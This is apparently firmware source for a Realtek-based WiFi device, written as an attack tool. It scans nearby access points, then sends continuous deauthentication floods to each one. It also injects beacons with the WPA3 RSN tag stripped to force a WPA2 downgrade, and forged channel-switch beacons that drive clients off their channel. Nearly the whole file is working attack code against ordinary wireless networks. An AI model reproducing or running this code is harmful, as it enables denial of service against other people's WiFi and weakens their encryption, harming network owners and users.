// imma try to match the footprint of my wifi event listener code
#include "wifi_stuffs.h"
#include "display.h"
#include "idk.h"
#include "button.h"

void setup() {
  init_buttons();
  init_display();
  drawIntro();
  wifi_off();
  wifi_on(RTW_MODE_PROMISC);
  activeDeauthMode = digitalRead(PA12);
  if (activeDeauthMode) display.println("Active Deauth Mode"), pinMode(PA12, INPUT_PULLUP);
  scan();

  if (activeDeauthMode) while (1) for (uint8_t i = 0; i < channels.size(); i++) {
    uint8_t ch = channels[i];
    wext_set_channel(WLAN0_NAME, ch);
    delay(1);
    for (auto& ap : AP_Map) if (ap.channel == ch) sendDeauth(ap.bssid);
    delay(1);
  }

  wext_set_channel(WLAN0_NAME, channels[channel_index]);
  wifi_set_promisc(RTW_PROMISC_ENABLE_3, sniffer, 0);
  attach_buttons();

  xTaskCreate([](void* _) {
    while (1) {
      bool f = false;

      for (auto& ap : AP_Map) {
        if (ap.channel != channels[channel_index]) continue;
        
        if (deauth) {
          sendDeauth(ap.bssid);
          f = true;
        }

        if (wpa2 && ap.beaconFound /*&& ap.isWPA3*/) {
          if (!ap.wpa2Beacon) { // beacon will be <= before
            ap.wpa2Beacon = (uint8_t*)malloc(ap.beaconLen);
            memcpy(ap.wpa2Beacon, ap.beacon, ap.beaconLen);
            ap.wpa2BeaconLen = ap.beaconLen;
            removeWPA3RSNTag(ap.wpa2Beacon, &ap.wpa2BeaconLen);
          } else{
            wifi_tx_raw_frame(ap.wpa2Beacon, ap.wpa2BeaconLen);
            f = true;
          }
        }

        if (csa && ap.beaconFound) {
          if (!ap.CSABeacon) { // beacon will be > before
            ap.CSABeacon = (uint8_t*)malloc(ap.beaconLen + 16); // idk what to say here
            memcpy(ap.CSABeacon, ap.beacon, ap.beaconLen);
            ap.CSABeaconLen = ap.beaconLen;
            insertCSA(ap.CSABeacon, &ap.CSABeaconLen, (ap.channel + 3 > 13) ? 1 : ap.channel + 3, 0);
          } else {
            wifi_tx_raw_frame(ap.CSABeacon, ap.CSABeaconLen);
            f = true;
          }
        }

      }

      if (!f) delay(250);
      else delay(20);
    }
  }, "balls", 4000, NULL, 2, NULL);
}

void loop() {
  draw();
  delay(100);
}
